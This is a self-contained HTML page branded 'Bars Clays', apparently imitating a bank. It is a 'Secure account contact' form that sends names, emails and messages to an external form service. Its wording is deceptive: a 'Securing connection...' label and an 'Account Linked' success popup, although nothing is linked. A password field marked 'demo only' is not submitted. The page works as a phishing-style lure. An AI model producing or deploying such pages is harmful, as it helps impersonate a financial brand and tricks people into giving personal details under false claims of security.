<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bars Clays</title>

<style>

/* ---------- GLOBAL ---------- */

*{margin:0;padding:0;box-sizing:border-box;}

body{
font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:
radial-gradient(circle at 20% 20%, #1a1f2a, #0b0e11 60%);
padding:20px;
}

/* ---------- CARD ---------- */

.container{
width:100%;
max-width:420px;
background:#fff;
border-radius:18px;
padding:42px 30px;
box-shadow:0 25px 70px rgba(0,0,0,.45);
animation:fadeIn .6s ease;
}

@keyframes fadeIn{from{opacity:0;transform:translateY(15px)}}

/* ---------- LOGO ---------- */

.logo{
text-align:center;
font-size:30px;
font-weight:700;
color:#fcd535;
margin-bottom:8px;
}

.subtitle{
text-align:center;
color:#777;
margin-bottom:34px;
}

/* ---------- FLOATING INPUT ---------- */

.field{
position:relative;
margin-bottom:22px;
}

.field input,
.field textarea{
width:100%;
padding:18px 14px 12px 14px;
border-radius:10px;
border:1px solid #dfe3e8;
font-size:16px;
background:#fafafa;
}

.field label{
position:absolute;
left:14px;
top:16px;
font-size:15px;
color:#777;
pointer-events:none;
transition:.2s;
background:white;
padding:0 4px;
}

.field input:focus,
.field textarea:focus{
outline:none;
border-color:#fcd535;
box-shadow:0 0 0 3px rgba(252,213,53,.15);
background:white;
}

/* float animation */

.field input:focus + label,
.field input:not(:placeholder-shown) + label,
.field textarea:focus + label,
.field textarea:not(:placeholder-shown) + label{
top:-8px;
font-size:12px;
color:#fcd535;
}

/* ---------- PASSWORD STRENGTH ---------- */

.strength{
height:6px;
border-radius:4px;
background:#eee;
margin-top:6px;
overflow:hidden;
}

.strength span{
display:block;
height:100%;
width:0%;
transition:.3s;
}

/* ---------- SHOW PASSWORD ---------- */

.toggle{
position:absolute;
right:12px;
top:16px;
cursor:pointer;
font-size:13px;
color:#888;
}

/* ---------- BUTTON ---------- */

button{
width:100%;
padding:17px;
border:none;
border-radius:10px;
background:#fcd535;
font-weight:700;
font-size:16px;
cursor:pointer;
display:flex;
justify-content:center;
align-items:center;
gap:10px;
}

button:disabled{opacity:.7}

/* spinner */

.spinner{
width:18px;height:18px;
border:3px solid #000;
border-top:3px solid transparent;
border-radius:50%;
animation:spin .8s linear infinite;
display:none;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* ---------- SHAKE INVALID ---------- */

@keyframes shake{
0%,100%{transform:translateX(0)}
20%{transform:translateX(-6px)}
40%{transform:translateX(6px)}
60%{transform:translateX(-4px)}
80%{transform:translateX(4px)}
}
.shake{animation:shake .35s}

/* ---------- SUCCESS POPUP ---------- */

.popup{
position:fixed;
top:0;left:0;
width:100%;height:100%;
background:rgba(0,0,0,.6);
display:none;
justify-content:center;
align-items:center;
}

.popup-box{
background:#1E2329;
color:#EAECEF;
padding:40px 30px;
border-radius:14px;
max-width:340px;
text-align:center;
}

.check{
width:80px;height:80px;
background:#0ECB81;
border-radius:50%;
margin:0 auto 20px;
display:flex;
align-items:center;
justify-content:center;
font-size:40px;
color:white;
animation:pop .45s;
}

@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}

.popup button{
margin-top:20px;
background:#FCD535;
padding:12px 24px;
border-radius:8px;
}

/* MOBILE */

@media(max-width:420px){
.container{padding:32px 22px}
.logo{font-size:26px}
}

</style>
</head>

<body>

<div class="container">

<div class="logo">Bars Clays</div>
<div class="subtitle">Secure account contact</div>

<form id="form" action="https://formspree.io/f/xjgewvle" method="POST">

<div class="field">
<input name="name" required placeholder=" ">
<label>Full name</label>
</div>

<div class="field">
<input type="email" name="email" required placeholder=" ">
<label>Email address</label>
</div>

<!-- PASSWORD VISUAL ONLY -->

<div class="field">
<input type="password" id="pass" placeholder=" ">
<label>Password (demo only)</label>
<div class="toggle" onclick="togglePass()">SHOW</div>
<div class="strength"><span id="bar"></span></div>
</div>

<div class="field">
<textarea name="message" rows="4" required placeholder=" "></textarea>
<label>Message</label>
</div>

<button id="btn">
<span id="txt">Continue</span>
<div id="spin" class="spinner"></div>
</button>

</form>
</div>


<!-- POPUP -->

<div id="popup" class="popup">
<div class="popup-box">
<div class="check">âœ”</div>
<h2 style="color:#0ECB81">Account Linked</h2>
<p>Your details were received safely.</p>
<button onclick="popup.style.display='none'">OK</button>
</div>
</div>


<script>

const f=document.getElementById("form");
const btn=document.getElementById("btn");
const spin=document.getElementById("spin");
const txt=document.getElementById("txt");
const popup=document.getElementById("popup");

/* submit */

f.addEventListener("submit",async e=>{
e.preventDefault();

if(!f.checkValidity()){
f.classList.add("shake");
setTimeout(()=>f.classList.remove("shake"),400);
return;
}

btn.disabled=true;
spin.style.display="block";
txt.textContent="Securing connection...";

try{
const r=await fetch(f.action,{
method:"POST",
body:new FormData(f),
headers:{Accept:"application/json"}
});
if(!r.ok) throw 0;
popup.style.display="flex";
f.reset();
}catch{
alert("Network error");
}

btn.disabled=false;
spin.style.display="none";
txt.textContent="Continue";

});

/* password strength visual */

document.getElementById("pass").oninput=e=>{
let v=e.target.value.length;
let w=Math.min(v*10,100);
let bar=document.getElementById("bar");
bar.style.width=w+"%";
bar.style.background=w<40?"#d93025":w<70?"#f9ab00":"#0ECB81";
};

/* show hide */

function togglePass(){
let p=document.getElementById("pass");
p.type=p.type==="password"?"text":"password";
}

</script>

</body>
</html>
